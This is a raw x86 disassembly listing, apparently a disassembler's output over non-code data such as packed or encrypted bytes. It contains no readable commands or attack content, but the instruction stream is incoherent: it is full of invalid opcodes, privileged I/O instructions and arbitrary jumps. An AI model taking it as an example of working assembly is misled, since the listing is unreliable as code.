  49317e:	push   es
  49317f:	pop    eax
  493180:	mov    edi,0xdb812a91
  493185:	iret   
  493186:	mov    es,WORD PTR [edi]
  493188:	or     BYTE PTR [esi+eax*2],al
  49318b:	daa    
  49318c:	ja     0x49316f
  49318e:	sbb    BYTE PTR [esp+ebp*4+0x67],cl
  493192:	das    
  493193:	aaa    
  493194:	sub    eax,DWORD PTR [edx+0x1a]
  493197:	stos   DWORD PTR es:[edi],eax
  493198:	dec    edi
  493199:	mov    edi,0x182445b6
  49319e:	xchg   DWORD PTR [edi+0x54212ac],ebp
  4931a4:	mov    bh,0xdf
  4931a6:	and    al,BYTE PTR [esi]
  4931a8:	adc    ebp,DWORD PTR [ecx-0x9]
  4931ab:	jne    0x493137
  4931ad:	sbb    BYTE PTR [edi+ebx*4-0x11],dl
  4931b1:	push   esi
  4931b2:	sbb    eax,DWORD PTR [ecx+ebp*2]
  4931b5:	dec    edi
  4931b6:	inc    edx
  4931b7:	mov    cl,0x61
  4931b9:	push   ebp
  4931ba:	adc    al,0xdf
  4931bc:	add    edx,eax
  4931be:	rol    BYTE PTR [ecx+ebp*8-0x3a],1
  4931c2:	test   DWORD PTR [ecx+0x2e],0x471c0dba
  4931c9:	ss pop ds
  4931cb:	xor    DWORD PTR [edi-0x49b2cac9],ecx
  4931d1:	dec    esi
  4931d2:	xor    al,0x97
  4931d4:	aaa    
  4931d5:	and    DWORD PTR [eax],edx
  4931d7:	mov    ds:0x70c35fb0,al
  4931dc:	mov    ecx,DWORD PTR [ecx]
  4931de:	(bad)  
  4931df:	not    BYTE PTR [bp+si]
  4931e2:	pop    esp
  4931e3:	add    bh,BYTE PTR [esi]
  4931e5:	xlat   BYTE PTR ds:[ebx]
  4931e6:	xlat   BYTE PTR ds:[ebx]
  4931e7:	mov    ah,0xad
  4931e9:	dec    ebx
  4931ea:	add    al,0x8f
  4931ec:	pop    ss
  4931ed:	shl    BYTE PTR [eax],0x5a
  4931f0:	add    ecx,DWORD PTR [edi]
  4931f2:	(bad)  
  4931f3:	and    eax,0xb39d848f
  4931f8:	fild   WORD PTR [ebx+0x11]
  4931fb:	sub    al,BYTE PTR [ebx+eiz*2]
  4931fe:	fild   WORD PTR [ebx+0x5fbf2569]
  493204:	xor    ebp,DWORD PTR [edi]
  493206:	mov    al,ds:0x121e1049
  49320b:	iret   
  49320c:	sbb    eax,0xa7461831
  493211:	inc    ebx
  493212:	pop    eax
  493213:	inc    ebp
  493214:	ret    0x726
  493217:	pop    ds
  493218:	adc    BYTE PTR [ebx],al
  49321a:	(bad)  
  49321b:	sub    BYTE PTR [edi-0x49],dl
  49321e:	xor    al,0xc2
  493220:	adc    DWORD PTR [ebx],ebp
  493222:	xor    eax,0xb8450f3f
  493227:	xor    eax,0x39570b34
  49322c:	out    0xc4,eax
  49322e:	lea    ecx,[ebp-0x62]
  493231:	aaa    
  493232:	add    BYTE PTR [edx],dh
  493234:	jg     0x493200
  493236:	ret    0x7520
  493239:	leave  
  49323a:	mov    bh,0xb6
  49323c:	je     0x4931de
  49323e:	jne    0x49324b
  493240:	xchg   edi,eax
  493241:	pop    edi
  493243:	pop    eax
  493244:	mov    ecx,ss
  493246:	das    
  493247:	pop    es
  493248:	push   edi
  493249:	sbb    BYTE PTR ds:0xcfe70a76,dh
  49324f:	mov    esp,0x750316d
  493254:	out    0x3e,eax
  493256:	inc    ebp
  493257:	test   ecx,eax
  493259:	add    eax,ebp
  49325b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49325c:	adc    bl,dh
  49325e:	test   al,0xa2
  493260:	fist   WORD PTR [edi]
  493262:	fsub   DWORD PTR [ebp+0x7fafad03]
  493268:	pop    ss
  493269:	adc    DWORD PTR [ebx],ebp
  49326b:	jb     0x4932d8
  49326d:	bswap  edi
  49326f:	daa    
  493270:	push   esi
  493271:	push   0xb7ffad1d
  493276:	pop    ds
  493277:	sbb    eax,0x97f0d630
  49327c:	inc    edi
  49327d:	dec    edi
  49327e:	add    eax,0x6f6d62e3
  493283:	sub    DWORD PTR [edx],0x69
  493286:	ins    DWORD PTR es:[edi],dx
  493287:	inc    ecx
  493288:	push   edi
  493289:	jg     0x49326a
  49328b:	push   ebp
  49328c:	and    edi,DWORD PTR [ecx-0x4b]
  49328f:	rdtsc  
  493291:	dec    edi
  493292:	dec    ecx
  493293:	ins    BYTE PTR es:[edi],dx
  493294:	and    DWORD PTR [ecx],0x384ef17
  49329a:	and    esp,eax
  49329c:	xchg   DWORD PTR [edi+0x255b4bc2],ebx
  4932a2:	xchg   edi,eax
  4932a3:	inc    edi
  4932a4:	mov    ebx,0x1aab1569
  4932a9:	jg     0x493252
  4932ab:	cs cdq 
  4932ad:	fmul   DWORD PTR [ecx]
  4932af:	(bad)  
  4932b1:	pop    ecx
  4932b2:	pop    edx
  4932b3:	xchg   edx,eax
  4932b4:	or     edi,DWORD PTR [eax]
  4932b6:	lahf   
  4932b7:	aas    
  4932b8:	ret    0x22c1
  4932bb:	pop    edx
  4932bc:	mov    bl,0x7b
  4932be:	sbb    DWORD PTR [esi+0x5723d954],eax
  4932c4:	inc    edx
  4932c5:	sub    dh,BYTE PTR [eax+0x37450baa]
  4932cb:	mov    edi,0xb5155803
  4932d0:	pop    es
  4932d1:	mov    cl,0x89
  4932d3:	push   ecx
  4932d4:	mov    eax,0x321736c7
  4932d9:	das    
  4932da:	shl    BYTE PTR [ebx],1
  4932dc:	outs   dx,BYTE PTR ds:[esi]
  4932dd:	jb     0x493320
  4932df:	es pop ss
  4932e1:	(bad)  
  4932e2:	in     al,dx
  4932e3:	dec    ecx
  4932e4:	test   eax,0x3317e347
  4932e9:	and    ch,BYTE PTR [ebx]
  4932eb:	xor    eax,0x76a72712
  4932f0:	or     DWORD PTR [ebx],edi
  4932f2:	mov    al,0xa7
  4932f4:	mov    DWORD PTR [ebx+0x3a],0x46ffb2e2
  4932fb:	push   ebp
  4932fc:	add    BYTE PTR [ebx],al
  4932fe:	mov    eax,ds:0x4589afa7
  493303:	xchg   DWORD PTR [ebp-0x2fe6aee9],ecx
  493309:	sub    al,BYTE PTR [edi-0x5390ba71]
  49330f:	push   0x62a74a7f
  493314:	xchg   ebp,eax
  493315:	xchg   esp,eax
  493316:	sbb    ebp,DWORD PTR [ebx+0x42d4addf]
  49331c:	pop    esp
  49331d:	pop    edi
  49331e:	out    0xdf,eax
  493320:	xor    eax,0xbe3ee2a
  493325:	xor    ecx,DWORD PTR [esi+0x5f]
  493328:	fnstcw WORD PTR [eax+0xb]
  49332b:	(bad)  
  49332c:	aas    
  49332d:	push   edi
  49332e:	pop    es
  49332f:	sbb    eax,DWORD PTR [eax]
  493331:	lods   al,BYTE PTR ds:[esi]
  493332:	dec    esi
  493333:	outs   dx,DWORD PTR ds:[esi]
  493334:	xlat   BYTE PTR ds:[ebx]
  493335:	adc    DWORD PTR [ecx],esp
  493337:	add    al,BYTE PTR [edx+0x27]
  49333a:	add    eax,0xe35c6535
  49333f:	(bad)  
  493340:	cs push esp
  493342:	push   eax
  493343:	(bad)  
  493344:	xor    edi,DWORD PTR [edi+0x3a]
  493347:	je     0x4932ea
  493349:	ficom  DWORD PTR [eax]
  49334b:	inc    edi
  49334c:	(bad)  
  49334d:	xor    bl,BYTE PTR [eax+0x5feb66b1]
  493353:	jg     0x493327
  493355:	push   0xb
  493357:	mov    al,0x8b
  493359:	iret   
  49335a:	or     DWORD PTR [eax],eax
  49335c:	mov    ds:0x20396f98,eax
  493361:	adc    al,0xd6
  493363:	outs   dx,DWORD PTR ds:[esi]
  493364:	push   DWORD PTR [edi]
  493366:	hlt    
  493367:	lods   eax,DWORD PTR ds:[esi]
  493368:	jae    0x49338b
  49336a:	push   edi
  49336b:	mov    ds:0x2291a08f,al
  493370:	mov    ds:0xc2845867,al
  493375:	and    bl,bh
  493377:	pop    ds
  493378:	mov    eax,0x8f352ad8
  49337d:	inc    esp
  49337e:	push   edi
  49337f:	das    
  493380:	xor    edx,DWORD PTR ds:0xcfd34aa4
  493386:	pop    es
  493387:	mov    esi,0xf7ad8a10
  49338c:	jg     0x49330e
  49338e:	add    DWORD PTR [edx-0x60b970d7],0x42
  493395:	ss adc dl,ah
  493398:	adc    BYTE PTR [edi+0x23701a41],ch
  49339e:	pop    es
  49339f:	mov    edx,0x49c4cf47
  4933a4:	push   0xae2f2f0b
  4933a9:	cwde   
  4933aa:	inc    esp
  4933ab:	and    edi,ebx
  4933ad:	xor    al,0xad
  4933af:	add    esp,DWORD PTR [eax]
  4933b1:	(bad)  
  4933b2:	lahf   
  4933b3:	pop    es
  4933b4:	in     eax,dx
  4933b5:	add    dh,BYTE PTR [ebp-0x18c4483e]
  4933bb:	pusha  
  4933bc:	pop    ebp
  4933bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4933be:	mov    ?,WORD PTR [edi]
  4933c0:	xor    al,BYTE PTR [edi-0x487aef56]
  4933c6:	(bad)  
  4933c8:	xlat   BYTE PTR ds:[ebx]
  4933c9:	push   ss
  4933ca:	add    DWORD PTR [edi],ecx
  4933cc:	aam    0x27
  4933ce:	mov    edi,0x328d6161
  4933d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4933d4:	jno    0x4933f0
  4933d6:	mov    edx,0xbfaec7d4
  4933db:	fisubr DWORD PTR [ebp+0x7e72375]
  4933e1:	dec    ecx
  4933e2:	push   0xc31f9b10
  4933e7:	pop    ebp
  4933e8:	popa   
  4933e9:	les    ebp,FWORD PTR [edi]
  4933eb:	mov    bh,0xf6
  4933ed:	dec    DWORD PTR [edx]
  4933ef:	push   ss
  4933f0:	pop    eax
  4933f1:	pop    eax
  4933f2:	out    0x3f,eax
  4933f4:	lods   al,BYTE PTR ds:[esi]
  4933f5:	xchg   ebx,eax
  4933f6:	ret    0xb7c1
  4933f9:	jmp    FWORD PTR [eax+edi*1]
  4933fc:	mov    bh,0x66
  4933fe:	fbstp  TBYTE PTR [ebx+0x247ad76e]
  493404:	push   es
  493405:	pop    ebp
  493406:	repz pop ss
  493408:	and    ch,BYTE PTR [ecx+0x23]
  49340b:	adc    al,0xca
  49340d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49340e:	sbb    al,0x34
  493410:	xor    BYTE PTR [edx],bh
  493412:	pop    es
  493413:	pop    edi
  493414:	inc    esi
  493415:	sbb    dh,BYTE PTR [ebp+0x58]
  493418:	loop   0x4933a9
  49341a:	inc    eax
  49341b:	adc    DWORD PTR [ebx-0x396b50bf],ebp
  493421:	mov    al,ds:0x4417e751
  493426:	sub    eax,0x7767ab12
  49342b:	sub    BYTE PTR [ebp+eiz*4+0x6a],bh
  49342f:	aaa    
  493430:	jecxz  0x49343c
  493432:	pop    ebp
  493433:	(bad)  
  493434:	push   eax
  493435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493436:	xor    eax,DWORD PTR [edi]
  493438:	push   ss
  493439:	pusha  
  49343a:	xor    al,0x50
  49343c:	jmp    FWORD PTR [edi-0x6d]
  49343f:	or     al,0x1d
  493441:	xlat   BYTE PTR ss:[ebx]
  493443:	inc    ecx
  493444:	aaa    
  493445:	sar    BYTE PTR [edx+0x31df42a6],1
  49344b:	pop    edi
  49344c:	lods   al,BYTE PTR ds:[esi]
  49344d:	mov    bh,0xad
  49344f:	or     cl,BYTE PTR [edi]
  493451:	iret   
  493452:	xor    eax,DWORD PTR [ebp+0x30]
  493455:	pop    eax
  493456:	adc    DWORD PTR [edi+0x78002f36],esp
  49345c:	les    eax,FWORD PTR [edx+0x5a3e7ff]
  493462:	test   DWORD PTR [edx+0x3f],ecx
  493465:	fild   QWORD PTR [edx+0xf458182]
  49346b:	sbb    bl,BYTE PTR [eax+0x4c]
  49346e:	rcl    bh,cl
  493470:	(bad)
  493475:	inc    esi
  493476:	(bad)  
  493477:	adc    al,0x2e
  493479:	in     al,0xc1
  49347b:	ret    0x310f
  49347e:	cmp    DWORD PTR [ebp-0x50],ecx
  493481:	push   edx
  493482:	pop    esp
  493483:	pop    ds
  493484:	pop    ds
  493485:	aam    0x56
  493487:	mov    ch,0x86
  493489:	iret   
  49348a:	aaa    
  49348b:	addr16 or ebp,ebx
  49348e:	add    al,0x85
  493490:	out    dx,eax
  493491:	call   0xbfbf6eea
  493496:	outs   dx,DWORD PTR ds:[esi]
  493497:	aaa    
  493498:	ds push ss
  49349a:	or     al,al
  49349c:	aaa    
  49349d:	daa    
  49349e:	(bad)  
  49349f:	inc    esi
  4934a0:	ret    
  4934a1:	and    edi,ebx
  4934a3:	scas   eax,DWORD PTR es:[edi]
  4934a4:	push   edi
  4934a5:	inc    ebp
  4934a6:	mov    eax,ds:0x75f168a
  4934ab:	push   ss
  4934ac:	shl    DWORD PTR [ebx],1
  4934ae:	mov    WORD PTR [ebx],ss
  4934b0:	xchg   edi,eax
  4934b1:	dec    eax
  4934b2:	add    al,0x1f
  4934b4:	xor    BYTE PTR [edi+0x77],ah
  4934b7:	sub    dl,BYTE PTR [esi+0x1a73fa46]
  4934bd:	pop    ss
  4934be:	popf   
  4934bf:	xchg   BYTE PTR [esi+0x379f1b5c],bh
  4934c5:	mov    ch,0x3a
  4934c7:	push   0x40457720
  4934cc:	mov    cl,BYTE PTR [esi]
  4934ce:	scas   eax,DWORD PTR es:[edi]
  4934cf:	daa    
  4934d0:	paddusw mm5,QWORD PTR [edx]
  4934d3:	add    BYTE PTR [ebx+0x43826767],al
  4934d9:	enter  0x6e85,0xbf
  4934dd:	mov    bl,0x2f
  4934df:	add    eax,0xc7af81d8
  4934e4:	inc    DWORD PTR [edi]
  4934e6:	pop    ecx
  4934e7:	bound  eax,QWORD PTR [eax+0x1ff73470]
  4934ed:	sbb    eax,0x6700b420
  4934f2:	mov    bh,0xc6
  4934f4:	inc    ebp
  4934f5:	inc    esp
  4934f6:	and    dl,BYTE PTR [edi]
  4934f8:	xor    DWORD PTR [edx],edi
  4934fa:	xchg   BYTE PTR [ebp-0x6e],dh
  4934fd:	xchg   edi,edx
  4934ff:	xor    edx,DWORD PTR [ebp+0x20]
  493502:	xor    eax,0x626f5789
  493507:	lds    esp,FWORD PTR [edx+0x7fef4a5b]
  49350d:	ret    
  49350e:	sub    cl,BYTE PTR [ecx]
  493510:	mov    ds:0x100f3767,eax
  493515:	mov    ebx,DWORD PTR [ebx-0x4f51b0b6]
  49351b:	push   es
  49351c:	sbb    al,0xe7
  49351e:	push   edi
  49351f:	cmp    edx,DWORD PTR [edx-0x69]
  493522:	pop    edx
  493523:	add    edi,DWORD PTR [edi]
  493525:	retf   
  493526:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493527:	inc    edi
  493528:	lea    ebp,[esi]
  49352a:	lahf   
  49352b:	inc    edi
  49352c:	imul   esi,DWORD PTR [eax+0x5b],0xacf73fd8
  493533:	les    ecx,FWORD PTR [ebx+ebp*8-0x39]
  493537:	ja     0x4934e9
  493539:	lock inc esi
  49353b:	test   DWORD PTR [edi],edi
  49353d:	push   edi
  49353e:	and    eax,0xe75d2ac2
  493543:	aaa    
  493544:	imul   esi,DWORD PTR fs:[ecx-0x6ea950c6],0x3a
  49354c:	adc    ebp,0x2d099f6f
  493552:	mov    ecx,0x30b68f58
  493557:	mov    bh,0x3
  493559:	fist   DWORD PTR [ecx+0x7f]
  49355c:	aaa    
  49355d:	mov    bh,0xc7
  49355f:	stos   DWORD PTR es:[edi],eax
  493560:	or     BYTE PTR [ebx-0x1bf0fb5c],ch
  493566:	jnp    0x49358c
  493568:	in     al,0x46
  49356a:	inc    ebp
  49356b:	cs pop edi
  49356d:	cmp    cl,dl
  49356f:	dec    esi
  493570:	in     eax,dx
  493571:	ror    bl,1
  493573:	iret   
  493574:	out    dx,al
  493575:	ret    0x4c1a
  493578:	mov    esp,0x10559fdf
  49357d:	ss sub al,0x4f
  493580:	mov    edi,DWORD PTR [edi]
  493582:	pop    edx
  493583:	xor    dh,BYTE PTR [ebx+0x63]
  493586:	pop    DWORD PTR [esi-0x65]
  493589:	jno    0x493534
  49358b:	adc    eax,0xb8bf1757
  493590:	pop    edx
  493591:	call   0x4167:0x35a641bc
  493598:	push   edx
  493599:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  49359a:	or     DWORD PTR [edi-0x11],ebx
  49359d:	xchg   edi,eax
  49359e:	xor    eax,0x98557c84
  4935a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4935a4:	inc    edx
  4935a5:	add    BYTE PTR ds:0xa8702aea,dh
  4935ab:	push   edi
  4935ac:	push   edi
  4935ad:	xor    ecx,DWORD PTR [edx+0x3f24412e]
  4935b3:	sti    
  4935b4:	xor    bl,BYTE PTR [edi]
  4935b6:	mov    ds:0x422e7056,eax
  4935bb:	push   edi
  4935bc:	inc    ebx
  4935bd:	dec    edx
  4935be:	adc    ebx,ecx
  4935c0:	les    edi,FWORD PTR [edi+0x5db58850]
  4935c6:	inc    edi
  4935c7:	xchg   DWORD PTR [bx+si+0x52],edx
  4935cb:	pop    eax
  4935cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4935cd:	dec    edi
  4935ce:	iret   
  4935cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4935d0:	mov    cl,0x40
  4935d2:	pop    edx
  4935d3:	shl    DWORD PTR [edi-0x2b53baba],cl
  4935d9:	das    
  4935da:	(bad)  
  4935db:	mov    eax,0x17a4ab51
  4935e0:	inc    DWORD PTR [edx+0x10]
  4935e3:	and    DWORD PTR [edx],0x80a7774a
  4935e9:	ror    DWORD PTR [eax],1
  4935eb:	outs   dx,DWORD PTR ds:[esi]
  4935ec:	xlat   BYTE PTR ds:[ebx]
  4935ed:	push   es
  4935ee:	push   0xdf4f18cd
  4935f3:	add    eax,ebx
  4935f5:	inc    esp
  4935f6:	mov    WORD PTR [ebx-0x2a],cs
  4935f9:	inc    esi
  4935fa:	bound  esi,QWORD PTR [ecx-0x61]
  4935fd:	xor    DWORD PTR [ecx+0x14],0x59
  493601:	sub    ecx,DWORD PTR [edi+0x35b30a7]
  493607:	push   esi
  493608:	mov    bh,0xf7
  49360a:	dec    edi
  49360b:	scas   eax,DWORD PTR es:[edi]
  49360c:	mov    edx,0x5edd4ed2
  493611:	xchg   edi,eax
  493612:	lahf   
  493613:	(bad)  [eax+0x31263930]
  493619:	jg     0x4935d5
  49361b:	and    al,0x90
  49361d:	sbb    BYTE PTR [edi+esi*8+0x34],al
  493621:	or     ch,BYTE PTR [esp+ebp*2+0x5f]
  493625:	iret   
  493626:	nop
  493627:	adc    al,0x98
  493629:	fimul  DWORD PTR [edi]
  49362b:	mov    esi,0xa835d536
  493630:	lea    ebx,[edi]
  493632:	out    dx,eax
  493633:	inc    eax
  493634:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  493635:	push   cs
  493636:	imul   eax,DWORD PTR [edi-0x653ba5cb],0x92e42f17
  493640:	sbb    bh,al
  493642:	xor    eax,0xc932965f
  493647:	push   ebp
  493648:	fdiv   DWORD PTR [ebx+eiz*1-0x76e5cf89]
  49364f:	jge    0x493674
  493651:	or     edx,DWORD PTR [edi+0x6a]
  493654:	imul   eax,ebp,0x29
  493657:	pop    ds
  493658:	call   FWORD PTR [eax-0xe]
  49365b:	bound  esi,QWORD PTR [eax]
  49365d:	retf   0x467f
  493660:	sbb    BYTE PTR [ecx],bh
  493662:	lods   al,BYTE PTR ds:[esi]
  493663:	push   edx
  493664:	jae    0x4936bd
  493666:	scas   al,BYTE PTR es:[edi]
  493667:	test   al,0xc4
  493669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49366a:	adc    eax,0x6488778f
  49366f:	pop    ebp
  493670:	mov    cl,0x9f
  493672:	cmp    DWORD PTR [edi-0x6e1f957b],edx
  493678:	jb     0x4936f9
  49367a:	mov    ch,0x22
  49367c:	adc    ah,BYTE PTR [ebx]
  49367e:	neg    bh
  493680:	cmp    DWORD PTR [esi+0x69],edx
  493683:	mov    ds:0x1a179f97,eax
  493688:	sub    BYTE PTR ds:0x4c1f4b43,bl
  49368e:	sub    eax,0x774ac18e
  493693:	adc    al,BYTE PTR [ebx-0x66]
  493696:	(bad)  
  493697:	pop    ds
  493698:	das    
  493699:	push   edi
  49369a:	adc    DWORD PTR [edx],edi
  49369c:	dec    ebp
  49369d:	or     al,0xe2
  49369f:	dec    edi
  4936a0:	ins    BYTE PTR es:[edi],dx
  4936a1:	shr    BYTE PTR [ebx+esi*1+0x17],0xff
  4936a6:	aaa    
  4936a7:	stos   DWORD PTR es:[edi],eax
  4936a8:	mov    bl,0x1e
  4936aa:	lock sub ebx,edx
  4936ad:	jg     0x4936ce
  4936af:	and    ebx,DWORD PTR [esp+ebx*2]
  4936b2:	ins    BYTE PTR es:[edi],dx
  4936b3:	ja     0x4936f6
  4936b5:	imul   esp,DWORD PTR [edi+0x48],0xffffffc3
  4936b9:	mov    dh,0x82
  4936bb:	scas   eax,DWORD PTR es:[edi]
  4936bc:	addr16 xsha1 (bad)
  4936be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4936bf:	mov    bl,BYTE PTR [ebp+0x6b]
  4936c2:	xchg   edi,ebx
  4936c4:	(bad)  
  4936c5:	cmp    DWORD PTR [esi-0x485beab3],ebp
  4936cb:	xor    al,0x6f
  4936cd:	cmp    BYTE PTR [ecx+0x314e42c1],ah
  4936d3:	ficomp DWORD PTR [eax]
  4936d5:	add    eax,DWORD PTR [edx-0x7d]
  4936d8:	push   edi
  4936d9:	outs   dx,DWORD PTR ds:[esi]
  4936da:	aam    0xb6
  4936dc:	xchg   edx,eax
  4936dd:	test   eax,0x51274117
  4936e2:	pop    ebx
  4936e3:	ret    0x7fe5
  4936e6:	xchg   edx,eax
  4936e7:	test   DWORD PTR [ecx+esi*1+0x6],0x85c71f28
  4936ef:	inc    esi
  4936f0:	push   eax
  4936f1:	mov    bl,0x7
  4936f3:	inc    ebp
  4936f4:	pop    es
  4936f5:	adc    eax,0x1ec54600
  4936fa:	das    
  4936fb:	das    
  4936fc:	arpl   WORD PTR [ecx+0x60],dx
  4936ff:	imul   eax,DWORD PTR [edi],0x76
  493702:	mov    ebp,eax
  493704:	imul   ebx,DWORD PTR [edi+0x18b74186],0x38e4b587
  49370e:	(bad)  
  493710:	adc    eax,0x572ff857
  493715:	pop    ss
  493716:	inc    ecx
  493717:	sbb    BYTE PTR [ebx+0x6f387256],ch
  49371d:	pop    eax
  49371e:	adc    ah,0x20
  493721:	movq   mm1,QWORD PTR [ecx]
  493724:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493725:	inc    esi
  493726:	add    DWORD PTR [edi-0x29cf6255],ecx
  49372c:	pop    ds
  49372d:	inc    DWORD PTR [esi+0x21]
  493730:	xor    edx,DWORD PTR [eax+ebx*1]
  493733:	aas    
  493734:	inc    edx
  493735:	lods   eax,DWORD PTR ds:[esi]
  493736:	inc    esi
  493737:	inc    ecx
  493738:	mov    ebx,0xa1163f0f
  49373d:	add    dh,BYTE PTR [ecx+0x3f]
  493740:	scas   eax,DWORD PTR es:[edi]
  493741:	pop    edx
  493742:	pop    ss
  493743:	pop    edx
  493744:	mov    cl,0x57
  493746:	aaa    
  493747:	add    BYTE PTR [edx],dl
  493749:	or     eax,0xc674f6e
  49374e:	or     ebp,DWORD PTR [ebx+0x862f700]
  493754:	or     esi,eax
  493756:	jae    0x4937c7
  493758:	outs   dx,DWORD PTR ds:[esi]
  493759:	dec    ecx
  49375a:	ins    DWORD PTR es:[edi],dx
  49375b:	daa    
  49375c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49375d:	adc    bh,BYTE PTR [edi]
  49375f:	lods   eax,DWORD PTR ds:[esi]
  493760:	jo     0x49370d
  493762:	fcomp  st(7)
  493764:	out    dx,eax
  493765:	pop    ds
  493766:	scas   eax,DWORD PTR es:[edi]
  493767:	cli    
  493768:	rcr    bl,0x2d
  49376b:	push   edi
  49376c:	pop    ss
  49376d:	mov    ds:0x116eba,eax
  493772:	fistp  WORD PTR [edx+0x3f]
  493775:	push   ecx
  493776:	and    BYTE PTR [esi-0x4c],dl
  493779:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49377a:	stos   BYTE PTR es:[edi],al
  49377b:	ss mov ch,0xad
  49377e:	out    dx,eax
  49377f:	xchg   edi,eax
  493780:	jg     0x4937fa
  493782:	mov    WORD PTR [eax+0x2a42ffb4],gs
  493788:	xchg   esi,eax
  493789:	sbb    al,0x4
  49378b:	pop    edi
  49378c:	inc    ebx
  49378d:	xchg   DWORD PTR [eax+esi*1],ecx
  493790:	adc    BYTE PTR cs:[edi-0x1],bh
  493794:	push   0x6b
  493796:	(bad)  
  493797:	sbb    esi,DWORD PTR [edi]
  493799:	cmp    edi,0x18
  49379c:	or     al,0x25
  49379e:	in     al,0x35
  4937a0:	pop    ss
  4937a1:	add    BYTE PTR [eax],cl
  4937a3:	mov    ebp,DWORD PTR [esi]
  4937a5:	inc    edx
  4937a6:	xchg   ebx,eax
  4937a7:	jo     0x49375a
  4937a9:	ficom  DWORD PTR [ecx-0x19]
  4937ac:	xor    DWORD PTR [edi+0x4b],edx
  4937af:	lods   al,BYTE PTR ds:[esi]
  4937b0:	bound  eax,QWORD PTR [eax]
  4937b2:	(bad)  
  4937b3:	iret   
  4937b4:	xor    al,0x7f
  4937b6:	push   es
  4937b7:	out    dx,eax
  4937b8:	popa   
  4937b9:	push   ecx
  4937ba:	ja     0x4937cf
  4937bc:	add    ecx,edx
  4937be:	jno    0x49376b
  4937c0:	push   0x16772fa3
  4937c5:	mov    ss,WORD PTR [eax]
  4937c7:	call   0x561c9f6c
  4937cc:	stos   DWORD PTR es:[edi],eax
  4937cd:	push   ebx
  4937ce:	and    ch,BYTE PTR [edi+0x37]
  4937d1:	and    al,dl
  4937d3:	mov    cr6,ebx
  4937d6:	aaa    
  4937d7:	ja     0x4937f5
  4937d9:	adc    DWORD PTR [ebx+0x1173df85],ebp
  4937df:	inc    edx
  4937e0:	add    esp,DWORD PTR ds:0x51869727
  4937e6:	pusha  
  4937e7:	bound  ecx,QWORD PTR [edi]
  4937e9:	movhlps xmm0,xmm0
  4937ec:	inc    eax
  4937ed:	xchg   ecx,eax
  4937ee:	ja     0x493825
  4937f0:	or     ch,BYTE PTR [ecx+0x8]
  4937f3:	xor    DWORD PTR [edi+0xa546b3f],esi
  4937f9:	shr    BYTE PTR [edx-0x31],1
  4937fc:	lods   eax,DWORD PTR ds:[esi]
  4937fd:	fld    DWORD PTR [edx]
  4937ff:	jbe    0x493808
  493801:	outs   dx,DWORD PTR ds:[esi]
  493802:	adc    eax,0x7765ab40
  493807:	lahf   
  493808:	xor    eax,0x41d2e918
  49380d:	dec    edi
  49380e:	mov    edi,0xa6d7dac0
  493813:	xlat   BYTE PTR ds:[ebx]
  493814:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493815:	xlat   BYTE PTR ds:[ebx]
  493816:	push   0xb759b416
  49381b:	(bad)  
  49381c:	adc    esp,DWORD PTR [ecx]
  49381e:	xor    al,0x40
  493820:	(bad)  
  493821:	pop    edi
  493822:	xor    ch,BYTE PTR [edx+eax*2-0x60c09c95]
  493829:	out    0x54,eax
  49382b:	push   ebx
  49382c:	xor    ebp,DWORD PTR [edi+ebp*1]
  49382f:	xor    al,0x37
  493831:	and    DWORD PTR [eax-0x3b],ebx
  493834:	sbb    bl,BYTE PTR [edi+0xf]
  493837:	imul   esp,DWORD PTR [eax+0x3],0x340033e4
  49383e:	pop    edi
  49383f:	xor    ebp,DWORD PTR [ebp-0x60bd2f68]
  493845:	xchg   edi,eax
  493846:	outs   dx,DWORD PTR ds:[esi]
  493847:	add    eax,0x375741b9
  49384c:	daa    
  49384d:	lods   eax,DWORD PTR ds:[esi]
  49384e:	add    edx,0xffffff92
  493851:	inc    esp
  493852:	pop    ds
  493853:	ret    
  493854:	ror    BYTE PTR [edx],0x1
  493857:	push   edi
  493858:	nop
  493859:	mov    al,0xa6
  49385b:	adc    eax,0x3b8527af
  493860:	push   eax
  493861:	push   0xf7ffd797
  493866:	push   0xfffffff2
  493868:	ins    DWORD PTR es:[edi],dx
  493869:	ror    BYTE PTR [ebx],1
  49386b:	cmovne ebx,DWORD PTR [eax-0x73]
  49386f:	push   es
  493870:	mov    ah,0x7
  493872:	mov    edi,0xb66b084
  493877:	outs   dx,DWORD PTR ds:[esi]
  493878:	fiadd  DWORD PTR [eax]
  49387a:	pusha  
  49387b:	push   0xffffffa7
  49387d:	inc    edx
  49387e:	xchg   edi,eax
  49387f:	sbb    eax,0xdf0580d8
  493884:	mov    edi,0x2a85419f
  493889:	lea    ebx,[edi]
  49388b:	pop    edx
  49388c:	or     eax,0x8777d630
  493891:	push   ss
  493892:	xchg   edi,eax
  493893:	mov    ah,0x4b
  493895:	add    esp,edi
  493897:	push   0x7300d460
  49389c:	jne    0x493833
  49389e:	mov    BYTE PTR [esi-0x79],dl
  4938a1:	xchg   edi,eax
  4938a2:	push   ebx
  4938a3:	xchg   esi,eax
  4938a4:	push   esi
  4938a5:	jne    0x4938e8
  4938a7:	xchg   edi,eax
  4938a8:	inc    ecx
  4938a9:	push   DWORD PTR [esi]
  4938ab:	es stos BYTE PTR es:[edi],al
  4938ad:	adc    eax,0x2c3947bf
  4938b2:	or     esp,DWORD PTR [ecx+0x43028f19]
  4938b8:	mov    bl,0xd5
  4938ba:	pop    ss
  4938bb:	aaa    
  4938bc:	ss ja  0x49384c
  4938bf:	push   ebp
  4938c0:	pusha  
  4938c1:	lods   eax,DWORD PTR ds:[esi]
  4938c2:	xlat   BYTE PTR ds:[ebx]
